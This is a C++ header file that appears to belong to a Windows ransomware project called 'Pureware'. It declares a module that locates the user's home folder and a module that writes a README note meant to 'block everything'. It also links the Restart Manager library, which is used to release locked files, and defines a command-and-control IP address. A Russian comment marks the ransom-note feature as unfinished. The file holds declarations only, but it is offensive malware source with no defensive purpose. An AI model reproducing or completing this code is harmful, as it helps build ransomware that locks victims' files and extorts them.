#ifndef PUREWARE_PUREWARE_HPP_
#define PUREWARE_PUREWARE_HPP_

#pragma once
#pragma comment(lib, "Rstrtmgr.lib")

#include <spdlog/spdlog.h>
#include <spdlog/sinks/basic_file_sink.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <restartmanager.h>
#include <locale>
#include <shlobj.h> // For FileModule FOLDERID_*

using path_t = std::filesystem::path;

class FileModule
{
public:
    void FindDirectory(); // Searches for the directory that we have rights to "C:\Users \{Username}\" and assign to the directory class variable
private:
    PWSTR directoryPath_; // The directory that the FindDirectory method will assign

};
// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
class NoteModule
{
    std::wstring Note_that_would_be_set_in_file;

    void Create_README_file(path_t const README_path);
public:
    NoteModule();
    NoteModule(std::wstring Note_that_would_be_set_in_file);
    void NotifyUsersAboutWorkResults();
};

#define C2_IP_ADDRESS "192.168.255.254"

#endif // PUREWARE_PUREWARE_HPP_